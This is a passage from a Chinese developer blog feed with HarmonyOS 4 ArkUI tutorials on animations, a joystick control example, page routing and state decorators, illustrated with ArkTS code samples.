class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Image</span>($r(<span class="string">&#x27;app.media.ultramanIcon&#x27;</span>))  </span><br><span class="line">  .<span class="title function_">position</span>(&#123;<span class="attr">x</span>: <span class="variable language_">this</span>.<span class="property">ultraX</span>, <span class="attr">y</span>: <span class="variable language_">this</span>.<span class="property">ultraY</span>&#125;)  <span class="comment">//x轴坐标，Y轴坐标</span></span><br><span class="line">  .<span class="title function_">rotate</span>(&#123;</span><br><span class="line">  <span class="attr">angle</span>: <span class="variable language_">this</span>.<span class="property">ultraA</span>, <span class="comment">//旋转角度</span></span><br><span class="line">  <span class="attr">centerX</span>: <span class="string">&#x27;50%&#x27;</span>,   <span class="comment">//旋转中心横坐标</span></span><br><span class="line">  <span class="attr">centerY</span>: <span class="string">&#x27;50%&#x27;</span>&#125;)  <span class="comment">//旋转中心纵坐标</span></span><br><span class="line">  .<span class="title function_">width</span>(<span class="number">60</span>)  </span><br><span class="line">  .<span class="title function_">height</span>(<span class="number">60</span>)  </span><br><span class="line">  .<span class="title function_">animation</span>(&#123;<span class="attr">duration</span>: <span class="number">500</span>&#125;)  <span class="comment">//添加属性动画，在上表，设置动画时长为500ms</span></span><br><span class="line">  </span><br><span class="line"><span class="title class_">Row</span>()&#123;  <span class="comment">//四个方位的按钮</span></span><br><span class="line">  <span class="title class_">Button</span>(<span class="string">&#x27;←&#x27;</span>).<span class="title function_">backgroundColor</span>(<span class="string">&#x27;#36D&#x27;</span>) </span><br><span class="line">    .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;  </span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">ultraX</span> -= <span class="number">10</span>  </span><br><span class="line">    &#125;)  </span><br><span class="line">  <span class="title class_">Column</span>(&#123;<span class="attr">space</span>: <span class="number">40</span>&#125;)&#123;  </span><br><span class="line">    <span class="title class_">Button</span>(<span class="string">&#x27;↑&#x27;</span>).<span class="title function_">backgroundColor</span>(<span class="string">&#x27;#36D&#x27;</span>)  </span><br><span class="line">      .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;  </span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">ultraY</span> -= <span class="number">10</span>  </span><br><span class="line">      &#125;)  </span><br><span class="line">    <span class="title class_">Button</span>(<span class="string">&#x27;↓&#x27;</span>).<span class="title function_">backgroundColor</span>(<span class="string">&#x27;#36D&#x27;</span>)  </span><br><span class="line">      .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;  </span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">ultraY</span> += <span class="number">10</span>  </span><br><span class="line">      &#125;)  </span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="title class_">Button</span>(<span class="string">&#x27;→&#x27;</span>).<span class="title function_">backgroundColor</span>(<span class="string">&#x27;#36D&#x27;</span>)  </span><br><span class="line">    .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;  </span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">ultraX</span> += <span class="number">10</span>  </span><br><span class="line">    &#125;)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240112205208.png" alt="image.png"></p><h1 id="显式动画"><a href="#显式动画" class="headerlink" title="显式动画"></a>显式动画</h1><ul><li><strong>显式动画</strong>是通过全局<code>animateTo</code>函数来修改组件属性，实现属性变化时的渐变过度效果。</li><li>不需要在组件后添加<code>animation</code>属性，可以直接在触发事件处添加<code>animateTo</code>函数。<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Button</span>(<span class="string">&#x27;←&#x27;</span>).<span class="title function_">backgroundColor</span>(<span class="string">&#x27;#36D&#x27;</span>)  <span class="comment">//以←为例</span></span><br><span class="line">  .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;  <span class="comment">//添加点击事件</span></span><br><span class="line">    <span class="comment">//this.ultraX -= 10  </span></span><br><span class="line">    <span class="title function_">animateTo</span>(  </span><br><span class="line">      &#123;<span class="attr">duration</span>: <span class="number">500</span>&#125;,  <span class="comment">//动画参数，与animation相同</span></span><br><span class="line">      <span class="function">() =&gt;</span> &#123;  <span class="comment">//修改组件属性关联的状态变量</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">ultraX</span> -= <span class="number">10</span>  </span><br><span class="line">      &#125;  </span><br><span class="line">    )  </span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></li></ul><h1 id="组件转场动画"><a href="#组件转场动画" class="headerlink" title="组件转场动画"></a>组件转场动画</h1><ul><li><strong>组件转场动画</strong>是在组件插入或移除时的过渡动画，通过组件的<code>transition</code>属性来配置。</li></ul><table><thead><tr><th>参数名称</th><th>参数类型</th><th>必填</th><th>参数描述</th></tr></thead><tbody><tr><td>type</td><td>TransitionType</td><td>否</td><td>类型，默认包括组件新增和删除。默认是ALL</td></tr><tr><td>opacity</td><td>number</td><td>否</td><td>不透明度，为插入时起点和删除时终点的值<br>默认值：1，取值范围：[0,1]</td></tr><tr><td>translate</td><td>{<br>x? : number | string,<br>y? : number | string,<br>z? : number | string<br>}</td><td>否</td><td>平移效果，为插入时起点和删除时终点的值。<br>-x：横向的平移距离<br>-y：纵向的平移距离<br>-z：竖向的平移距离</td></tr><tr><td>scale</td><td>{<br>x? : number,<br>y? : number,<br>z? : number,<br>centerX? : number|string,<br>centerY? : number]string<br>}</td><td>否</td><td>缩放效果，为插入时起点和删除时终点的值。<br>-x：横向放大倍数(或缩小比例)。<br>-y：纵向放大倍数(或缩小比例)。<br>-z：当前为二维显示，该参数无效。<br>- centerX、centerY指缩放中心点。<br>- centerX和centerY默认值是”50%”。<br>- 中心点为0时，默认的是组件的左上角。</td></tr><tr><td>rotate</td><td>{<br>x?: number,<br>y?: number,<br>z?: number,<br>angle: number | string,<br>centerX?: number| string,<br>centerY?: numberl string<br>}</td><td>否</td><td>旋转效果:<br>angle是旋转角度，其它参数与scale类似</td></tr></tbody></table><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//触发事件处添加animateTo函数</span></span><br><span class="line"><span class="title function_">animateTo</span>(  </span><br><span class="line">  &#123;<span class="attr">duration</span>: <span class="number">1000</span>&#125;,  <span class="comment">//动画参数</span></span><br><span class="line">  <span class="function">() =&gt;</span> &#123;  </span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">iconFlag</span> = <span class="literal">true</span>  </span><br><span class="line">  &#125;  </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">iconFlag</span>)&#123;  </span><br><span class="line">  <span class="title class_">Image</span>($r(<span class="string">&#x27;app.media.ultramanIcon&#x27;</span>))  </span><br><span class="line">    .<span class="title function_">position</span>(&#123;<span class="attr">x</span>: <span class="variable language_">this</span>.<span class="property">ultraX</span>, <span class="attr">y</span>: <span class="variable language_">this</span>.<span class="property">ultraY</span>&#125;)  </span><br><span class="line">    .<span class="title function_">rotate</span>(&#123;<span class="attr">angle</span>: <span class="variable language_">this</span>.<span class="property">ultraA</span>, <span class="attr">centerX</span>: <span class="string">&#x27;50%&#x27;</span>, <span class="attr">centerY</span>: <span class="string">&#x27;50%&#x27;</span>&#125;)  </span><br><span class="line">    .<span class="title function_">width</span>(<span class="number">60</span>)  </span><br><span class="line">    .<span class="title function_">height</span>(<span class="number">60</span>)  </span><br><span class="line">    .<span class="title function_">transition</span>(&#123;  <span class="comment">//转场动画参数</span></span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">TransitionType</span>.<span class="property">Insert</span>,  <span class="comment">//设置为入场</span></span><br><span class="line">      <span class="attr">opacity</span>: <span class="number">0</span>,  <span class="comment">//设置入场时透明度为0</span></span><br><span class="line">      <span class="attr">translate</span>: &#123;<span class="attr">y</span>: -<span class="number">200</span>&#125;  <span class="comment">//设置从设定位置Y轴-200处平移入场</span></span><br><span class="line">    &#125;)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>更多转场动画可以参考<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-references-V3/ts-page-transition-animation-0000001477981233-V3">鸿蒙开发文档</a></li></ul><h1 id="实例：摇杆控制方向"><a href="#实例：摇杆控制方向" class="headerlink" title="实例：摇杆控制方向"></a>实例：摇杆控制方向</h1><ul><li>实现一个摇杆控制移动方向</li><li>图为静态效果<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240112232307.png" alt="image.png"><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明变量</span></span><br><span class="line"><span class="meta">@State</span> <span class="attr">ultraX</span>: <span class="built_in">number</span> = <span class="number">150</span>  <span class="comment">//图标的x轴</span></span><br><span class="line"><span class="meta">@State</span> <span class="attr">ultraY</span>: <span class="built_in">number</span> = <span class="number">250</span>  <span class="comment">//图标的y轴</span></span><br><span class="line"><span class="meta">@State</span> <span class="attr">ultraA</span>: <span class="built_in">number</span> = <span class="number">0</span>  <span class="comment">//图标的角度</span></span><br><span class="line"><span class="meta">@State</span> <span class="attr">iconFlag</span>: <span class="built_in">boolean</span> = <span class="literal">false</span>  <span class="comment">//是否出现图标</span></span><br><span class="line"><span class="keyword">private</span> <span class="attr">centerX</span>: <span class="built_in">number</span> = <span class="number">120</span>  <span class="comment">//摇杆的中心x轴</span></span><br><span class="line"><span class="keyword">private</span> <span class="attr">centerY</span>: <span class="built_in">number</span> = <span class="number">120</span>  <span class="comment">//摇杆的中心y轴</span></span><br><span class="line"><span class="keyword">private</span> <span class="attr">maxR</span>: <span class="built_in">number</span> = <span class="number">100</span>  <span class="comment">//摇杆外围半径</span></span><br><span class="line"><span class="keyword">private</span> <span class="attr">minR</span>: <span class="built_in">number</span> = <span class="number">20</span>  <span class="comment">//摇杆小半径</span></span><br><span class="line"><span class="meta">@State</span> <span class="attr">positionX</span>: <span class="built_in">number</span> = <span class="variable language_">this</span>.<span class="property">centerX</span>  <span class="comment">//摇杆位置x轴</span></span><br><span class="line"><span class="meta">@State</span> <span class="attr">positionY</span>: <span class="built_in">number</span> = <span class="variable language_">this</span>.<span class="property">centerY</span>  <span class="comment">//摇杆位置y轴</span></span><br><span class="line"><span class="attr">sin</span>: <span class="built_in">number</span> = <span class="number">0</span>  <span class="comment">//摇杆位置对于中心点的sin值</span></span><br><span class="line"><span class="attr">cos</span>: <span class="built_in">number</span> = <span class="number">0</span>  <span class="comment">//摇杆位置对于中心点的cos值</span></span><br><span class="line"><span class="attr">speed</span>: <span class="built_in">number</span> = <span class="number">0</span>  <span class="comment">//图标移动的速度</span></span><br><span class="line"><span class="attr">taskId</span>: <span class="built_in">number</span> = -<span class="number">1</span>  <span class="comment">//定时任务id</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//摇杆的外形，两个圆</span></span><br><span class="line"><span class="title class_">Row</span>()&#123;  </span><br><span class="line">  <span class="title class_">Circle</span>(&#123;<span class="attr">width</span>: <span class="variable language_">this</span>.<span class="property">maxR</span> * <span class="number">2</span>, <span class="attr">height</span>: <span class="variable language_">this</span>.<span class="property">maxR</span> * <span class="number">2</span>&#125;) </span><br><span class="line">    .<span class="title function_">fill</span>(<span class="string">&#x27;#20101010&#x27;</span>)  </span><br><span class="line">    .<span class="title function_">position</span>(&#123;<span class="attr">x</span>: <span class="variable language_">this</span>.<span class="property">centerX</span> - <span class="variable language_">this</span>.<span class="property">maxR</span>, <span class="attr">y</span>: <span class="variable language_">this</span>.<span class="property">centerY</span> - <span class="variable language_">this</span>.<span class="property">maxR</span>&#125;)  <span class="comment">//减去半径就是原点位置</span></span><br><span class="line">  <span class="title class_">Circle</span>(&#123;<span class="attr">width</span>: <span class="variable language_">this</span>.<span class="property">minR</span> * <span class="number">2</span>, <span class="attr">height</span>: <span class="variable language_">this</span>.<span class="property">minR</span> * <span class="number">2</span>&#125;)  </span><br><span class="line">    .<span class="title function_">fill</span>(<span class="string">&#x27;#403A3A3A&#x27;</span>)  </span><br><span class="line">    .<span class="title function_">position</span>(&#123;<span class="attr">x</span>: <span class="variable language_">this</span>.<span class="property">positionX</span> - <span class="variable language_">this</span>.<span class="property">minR</span>, <span class="attr">y</span>:<span class="variable language_">this</span>.<span class="property">positionY</span> - <span class="variable language_">this</span>.<span class="property">minR</span>&#125;)  </span><br><span class="line">&#125;</span><br><span class="line">.<span class="title function_">height</span>(<span class="number">240</span>)  </span><br><span class="line">.<span class="title function_">width</span>(<span class="number">240</span>)  </span><br><span class="line">.<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Center</span>)  </span><br><span class="line">.<span class="title function_">onTouch</span>(<span class="variable language_">this</span>.<span class="property">handleTouchEvent</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>))  <span class="comment">//代入获取手指触控数据的函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//摇杆数据计算和处理</span></span><br><span class="line"><span class="title function_">handleTouchEvent</span>(<span class="params">event: TouchEvent</span>)&#123;  <span class="comment">//获取手指触控数据函数</span></span><br><span class="line">  <span class="keyword">switch</span> (event.<span class="property">type</span>)&#123;  <span class="comment">//判断手指触摸屏幕的状态</span></span><br><span class="line">    <span class="keyword">case</span> <span class="title class_">TouchType</span>.<span class="property">Up</span>:  <span class="comment">//离开屏幕</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">speed</span> = <span class="number">0</span>  <span class="comment">//重置速度</span></span><br><span class="line">      <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">taskId</span>)  <span class="comment">//重置定时任务</span></span><br><span class="line">      <span class="title function_">animateTo</span>(  <span class="comment">//摇杆复位动画</span></span><br><span class="line">        &#123;<span class="attr">curve</span>: curves.<span class="title function_">springMotion</span>()&#125;,  <span class="comment">//缓慢复位</span></span><br><span class="line">        <span class="function">() =&gt;</span> &#123;  </span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">positionX</span> = <span class="variable language_">this</span>.<span class="property">centerX</span>  </span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">positionY</span> = <span class="variable language_">this</span>.<span class="property">centerY</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">      )  </span><br><span class="line">      <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">case</span> <span class="title class_">TouchType</span>.<span class="property">Down</span>:  <span class="comment">//按住屏幕</span></span><br><span class="line">      <span class="comment">//开始定时任务  </span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">taskId</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;  </span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">ultraX</span> += <span class="variable language_">this</span>.<span class="property">speed</span> * <span class="variable language_">this</span>.<span class="property">cos</span>  </span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">ultraY</span> += <span class="variable language_">this</span>.<span class="property">speed</span> * <span class="variable language_">this</span>.<span class="property">sin</span>  </span><br><span class="line">      &#125;, <span class="number">40</span>)  <span class="comment">//每40ms一次，相当于25帧</span></span><br><span class="line">      <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">case</span> <span class="title class_">TouchType</span>.<span class="property">Move</span>:  <span class="comment">//在屏幕上移动</span></span><br><span class="line">    <span class="comment">//获取手指位置坐标  </span></span><br><span class="line">      <span class="keyword">let</span> x = event.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">x</span>  </span><br><span class="line">      <span class="keyword">let</span> y = event.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">y</span>  </span><br><span class="line">    <span class="comment">//计算手指与中心点的坐标差值  </span></span><br><span class="line">      <span class="keyword">let</span> vx = x - <span class="variable language_">this</span>.<span class="property">centerX</span>  </span><br><span class="line">      <span class="keyword">let</span> vy = y - <span class="variable language_">this</span>.<span class="property">centerY</span>  </span><br><span class="line">    <span class="comment">//计算手指与中心点连线和x轴正半轴的夹角弧度  </span></span><br><span class="line">      <span class="keyword">let</span> angle = <span class="title class_">Math</span>.<span class="title function_">atan2</span>(vy, vx)  </span><br><span class="line">    <span class="comment">//计算手指与中心点的距离  </span></span><br><span class="line">      <span class="keyword">let</span> distance = <span class="variable language_">this</span>.<span class="title function_">getDistance</span>(vx, vy)  </span><br><span class="line">    <span class="comment">//计算摇杆小球的坐标  </span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">sin</span> = <span class="title class_">Math</span>.<span class="title function_">sin</span>(angle)  </span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">cos</span> = <span class="title class_">Math</span>.<span class="title function_">cos</span>(angle)  </span><br><span class="line">      <span class="title function_">animateTo</span>(  <span class="comment">//图标移动动画</span></span><br><span class="line">        &#123;<span class="attr">curve</span>: curves.<span class="title function_">responsiveSpringMotion</span>()&#125;,  <span class="comment">//跟手的平滑动画</span></span><br><span class="line">        <span class="function">() =&gt;</span> &#123;  </span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">positionX</span> = <span class="variable language_">this</span>.<span class="property">centerX</span> + distance * <span class="variable language_">this</span>.<span class="property">cos</span>  </span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">positionY</span> = <span class="variable language_">this</span>.<span class="property">centerY</span> + distance * <span class="variable language_">this</span>.<span class="property">sin</span>  </span><br><span class="line">          <span class="comment">//修改移动坐标  </span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">speed</span> = <span class="number">5</span>  <span class="comment">//设置移动速度</span></span><br><span class="line">        &#125;  </span><br><span class="line">      )  </span><br><span class="line">      <span class="keyword">break</span>  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//计算摇杆与中心点的位置，不超出外圈</span></span><br><span class="line"><span class="title function_">getDistance</span>(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>)&#123;  </span><br><span class="line">  <span class="keyword">let</span> d = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(x * x + y * y)  </span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">min</span>(d, <span class="variable language_">this</span>.<span class="property">maxR</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> harmonyos </tag>
            
            <tag> ArkUI </tag>
            
            <tag> ArkTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鸿蒙HarmonyOS 4-页面路由</title>
      <link href="/2024/01/12/%E9%B8%BF%E8%92%99HarmonyOS%204-%E9%A1%B5%E9%9D%A2%E8%B7%AF%E7%94%B1/"/>
      <url>/2024/01/12/%E9%B8%BF%E8%92%99HarmonyOS%204-%E9%A1%B5%E9%9D%A2%E8%B7%AF%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<h1 id="页面路由router"><a href="#页面路由router" class="headerlink" title="页面路由router"></a>页面路由router</h1><ul><li><strong>页面路由router</strong>是指在应用程序中实现不同页面之间的跳转和数据传递<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240112185855.png" alt="image.png"></li><li>页面保留在页面栈，先进后出，所以最先打开的在最前面</li><li>页面栈的最大容量上限是32个页面，使用<code>router.clear()</code>方法可以清空页面栈，释放内存</li><li>Router有两种页面跳转模式，分别是：</li></ul><ol><li><code>router.pushUrl()</code>：目标页不会替换当前页，而是压入页面栈，因此可以用<code>router.back()</code>返回当前页</li><li><code>router.replaceUrl()</code>：目标页替换当前页，当前页会被销毁并释放资源，无法返回当前页</li></ol><ul><li>Router有两种页面实例模式，分别是：</li></ul><ol><li><code>Standard</code>：标准实例模式，每次跳转都会建立一个目标页并压入栈顶。默认就是这个模式</li><li><code>single</code>：单实例模式，如果目标页已经存在，则将离栈顶最近的同Url页面移至栈顶并重新加载</li></ol><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><ol><li>首先要导入HarmonyOS提供的Router模块：<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;@ohos.router&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li>然后利用router实现跳转、返回等操作：<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//跳转页</span></span><br><span class="line">router.<span class="title function_">pushUrl</span>(  </span><br><span class="line">  &#123;  </span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;pages/PropPage&#x27;</span>, <span class="comment">//目标页面路径</span></span><br><span class="line">    <span class="attr">params</span>: &#123;<span class="attr">id</span>: <span class="number">1</span>&#125;  <span class="comment">//传递的参数（可选）</span></span><br><span class="line">  &#125;,  </span><br><span class="line">  router.<span class="property">RouterMode</span>.<span class="property">Single</span>,  <span class="comment">//页面模式</span></span><br><span class="line">  <span class="function"><span class="params">err</span> =&gt;</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span>(err)&#123;   <span class="comment">//异常响应</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`路由失败 errCode: <span class="subst">$&#123;err.code&#125;</span> errMsg: <span class="subst">$&#123;err.message&#125;</span>`</span>)  </span><br><span class="line">    &#125;  <span class="comment">//错误码：100001：内部错误，可能是页面渲染失败；100002：路由地址错误；100003：路由栈页面已满</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//目标页</span></span><br><span class="line"><span class="attr">params</span>: <span class="built_in">any</span> = router.<span class="title function_">getParams</span>() <span class="comment">//获取传递的参数</span></span><br><span class="line">router.<span class="title function_">showAlertBeforeBackPage</span>(&#123;</span><br><span class="line"><span class="attr">message</span>: <span class="string">&#x27;还未保存哦，确定要返回吗？&#x27;</span></span><br><span class="line">&#125;) <span class="comment">//返回提示弹窗，如果点取消，则返回操作会被终止。</span></span><br><span class="line">router.<span class="title function_">back</span>() <span class="comment">//返回上一页</span></span><br><span class="line">router.<span class="title function_">back</span>(  <span class="comment">//返回参数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">url</span>: <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"><span class="attr">params</span>: &#123;<span class="attr">id</span>: <span class="number">010</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li>在<code>base/main_pages.json</code>文件当中，记得添加该目标页地址<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240112194801.png" alt="image.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> harmonyos </tag>
            
            <tag> ArkUI </tag>
            
            <tag> ArkTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鸿蒙HarmonyOS 4-ArkUI状态管理</title>
      <link href="/2024/01/11/%E9%B8%BF%E8%92%99HarmonyOS%204-ArkUI%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86/"/>
      <url>/2024/01/11/%E9%B8%BF%E8%92%99HarmonyOS%204-ArkUI%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="State"><a href="#State" class="headerlink" title="@State"></a>@State</h1><ul><li>在声明式UI中，是以状态驱动视图更新：<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111205942.png" alt="image.png"><blockquote><ul><li>状态（State）：指驱动视图更新的数据（被装饰器标记的变量）</li><li>视图（View）：基于UI描述渲染得到用户界面</li><li>被State修饰的变量才能更新</li></ul></blockquote></li><li>说明：</li></ul><ol><li>@State装饰器标记的变量必须初始化，不能为空值。</li><li>@State支持Object、class、string、number、boolean、enum类型以及这些类型的数组。</li><li>嵌套类型以及数组中的对象属性无法触发视图更新。<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@State</span> <span class="attr">message</span>: <span class="built_in">string</span> = <span class="string">&#x27;Hello World !!&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="title function_">build</span>(<span class="params"></span>) &#123;   </span><br><span class="line"><span class="title function_">column</span>(<span class="params"></span>)&#123;  </span><br><span class="line">  <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="property">message</span>)  </span><br><span class="line">.<span class="title function_">fontSize</span>(<span class="number">30</span>)  </span><br><span class="line">.<span class="title function_">fontWeight</span>(<span class="title class_">FontWeight</span>.<span class="property">Bold</span>)  </span><br><span class="line">.<span class="title function_">fontColor</span>(<span class="string">&#x27;#36D&#x27;</span>)  </span><br><span class="line">.<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;  </span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">message</span> = <span class="string">&#x27;Hello ArkTS!&#x27;</span>  </span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure></li></ol><h1 id="Prop-Link"><a href="#Prop-Link" class="headerlink" title="@Prop &amp; @Link"></a>@Prop &amp; @Link</h1><ul><li>当父子组件之间需要数据同步时，可以使用@Prop和@Link装饰器。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240112150040.png" alt="image.png"></li></ul><table><thead><tr><th></th><th>@Prop</th><th>@Link</th></tr></thead><tbody><tr><td>同步类型</td><td>单向同步</td><td>双向同步</td></tr><tr><td>允许装饰的变量类型</td><td>- @Prop只支持string、number、boolean、enum类型<br>- 父组件对象类型，子组件是对象属性<br>- 不可以是数组、any</td><td>- 父子类型一直：string、number、boolean、enum、object、class，以及他们的数组<br>- 数组中元素增、删、替换会引起刷新<br>- 